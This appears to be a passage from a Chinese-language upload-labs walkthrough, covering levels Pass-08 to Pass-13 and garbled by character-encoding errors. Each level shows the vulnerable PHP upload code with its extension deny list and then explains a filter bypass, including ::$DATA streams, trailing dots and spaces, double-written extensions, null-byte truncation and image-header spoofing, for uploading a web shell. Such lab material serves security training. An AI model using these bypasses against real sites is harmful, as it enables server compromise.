title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™æ¬¡ç¼ºå°‘äº†å¯¹å­—ç¬¦ä¸²<code>::$DATA</code>çš„æ£€æµ‹ï¼Œå› æ­¤ä½¿ç”¨bpåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ å¯¹åº”å­—ç¬¦ï¼Œè¿æ¥æˆåŠŸã€‚<br>æŸ¥è¯¢ä¹‹åå‘ç°ï¼šåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+<code>::$DATA</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ<code>::$DATA</code>ä¹‹å‰çš„æ–‡ä»¶åï¼Œä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å<br>ä¾‹å¦‚:â€<code>phpinfo.php::$DATA</code>â€œWindowsä¼šè‡ªåŠ¨å»æ‰æœ«å°¾çš„<code>::$DATA</code>å˜æˆâ€<code>phpinfo.php</code>â€œ</p><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-7"><a href="#è§£æ³•-7" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™æ¬¡å‘ç°æŠŠå‰é¢èƒ½ç”¨çš„å‡ ç§æ–¹æ³•å…¨éƒ¨å µæ­»äº†ã€‚ä½†æ˜¯å¯ä»¥å‘ç°ï¼šphpæ–‡ä»¶ä¼šå…ˆåˆ é™¤.ï¼Œå†åˆ é™¤ç©ºæ ¼ã€‚æ‰€ä»¥å¯ä»¥ä¿®æ”¹åç¼€ä¸º<code>webshell.php. .</code>æ¥ç»•è¿‡ï¼Œç»è¿‡å¤„ç†ä¹‹åå˜æˆ<code>webshell.php.</code>ï¼Œè¿™æ ·å°±å¯ä»¥ä¸Šä¼ äº†ã€‚</p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-8"><a href="#è§£æ³•-8" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™æ¬¡ä¼šå¯¹è¿è§„çš„éƒ¨åˆ†ç›´æ¥ç§»é™¤ï¼Œå¯¼è‡´ä¸Šä¼ çš„phpåç¼€æ–‡ä»¶åç¼€ç¼ºå¤±ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™ç§ç§»é™¤çš„æƒ…å†µéƒ½å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼Œå³ä¿®æ”¹ä¸º<code>webshell.pphphp</code>ä¸Šä¼ ï¼Œè¿™æ ·ä¸Šä¼ åçš„æ–‡ä»¶åç¼€å°±ä¼šä¿®æ”¹ä¸ºæ­£å¸¸çš„<code>.php</code>ï¼Œå¯ä»¥æ­£å¸¸è¿æ¥ã€‚</p><h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-9"><a href="#è§£æ³•-9" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>è¿™æ¬¡æ˜¯ä½¿ç”¨ç™½åå•è¿‡æ»¤ï¼Œè€Œä¸”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00çš„æˆªæ–­ç»•è¿‡ï¼Œå³ï¼š<br>å…ˆä¸Šä¼ <code>webshell.jpg</code>ç„¶åä½¿ç”¨bpæŠ“åŒ…ï¼Œå°†<code>save_path</code>å‚æ•°ä¿®æ”¹ä¸ºä»¥ä¸‹å³å¯ä¸Šä¼ ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673689610306-ac532bbc-e2d6-4061-b1f3-377b4bb35972.png" alt="image.png"></p><h2 id="æ³¨æ„-1"><a href="#æ³¨æ„-1" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>phpç‰ˆæœ¬è¦å°äº<code>5.3.4</code> ä¿®æ”¹<code>php.ini</code>çš„<code>magic_quotes_gpc</code>ä¸ºOFFçŠ¶æ€</p><h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-10"><a href="#è§£æ³•-10" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p>ä¸ä¸Šä¸€å…³ç›¸æ¯”ï¼Œè¿™æ¬¡çš„<code>save_path</code>å‚æ•°æ˜¯åœ¨<code>POST</code>å†…çš„ï¼Œä½†æ˜¯åœ¨<code>POST</code>ä¸­åŠ <code>%00</code>å‚æ•°ä¸è¡Œï¼Œå› ä¸ºä¼šè¢«è§£æä¸ºå­—ç¬¦ä¸²ï¼Œä½†è‚¯å®šè¿˜æ˜¯ä½¿ç”¨<code>00</code>æ¥æˆªæ–­ï¼Œå› æ­¤è¿™é“é¢˜éœ€è¦ä¿®æ”¹<code>hex</code>ã€‚<br>å…ˆä¸Šä¼ <code>webshell.jpg</code>æ–‡ä»¶ï¼Œä¿®æ”¹ä¿å­˜è·¯å¾„ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªå­—ç¬¦<code>a</code>ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771713001-3916d4ff-baf3-42db-b504-02a210287690.png" alt="image.png"><br>ç„¶åæ‰“å¼€Burpsuiteçš„<code>Hex</code>æ¨¡å¼ï¼Œæ‰¾åˆ°å¯¹åº”<code>a</code>å­—ç¬¦çš„hexå€¼ä¿®æ”¹ä¸º00<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771889576-21235d91-3988-49a5-a490-67217b152112.png" alt="image.png"><br>ä¹Ÿå¯ä»¥rawæ¨¡å¼ä¸‹é€‰ä¸­aä¿®æ”¹hexä¸º00<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771934277-9f2bddb4-fe97-41cf-90ce-64de637342fa.png" alt="image.png"></p><h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•-11"><a href="#è§£æ³•-11" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h2><p><code>getReailFileType()</code>å‡½æ•°è·å–æ–‡ä»¶çš„æœ€å¼€å§‹ä¸¤ä¸ªå­—èŠ‚ï¼Œæ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å›¾ç‰‡æ–‡ä»¶æ¬ºéª—æ¥è¿›è¡Œæ”»å‡»ã€‚ä¸åŒç±»å‹æ–‡ä»¶æ–‡ä»¶å¤´æ ‡å‡†ç¼–ç æ˜¯ä¸åŒçš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">JPEG</span> (jpg)ï¼Œæ–‡ä»¶å¤´ï¼šFF D8 FF</span><br><span class="line"><span class="title function_ invoke__">PNG</span> (png)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span>     ã€å‚è€ƒï¼špngæ–‡ä»¶å¤´è¯¦è§£ã€‘<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>e <span class="number">47</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">1</span>a <span class="number">0</span>a</span><br><span class="line"><span class="title function_ invoke__">GIF</span> (gif)ï¼Œæ–‡ä»¶å¤´ï¼š<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="comment">//å¸¸ç”¨47 49 46 38 39 61 æ ‡è¯†GIF89a</span></span><br><span class="line">Windows <span class="title function_ invoke__">Bitmap</span> (bmp)ï¼Œæ–‡ä»¶å¤´ï¼š<span 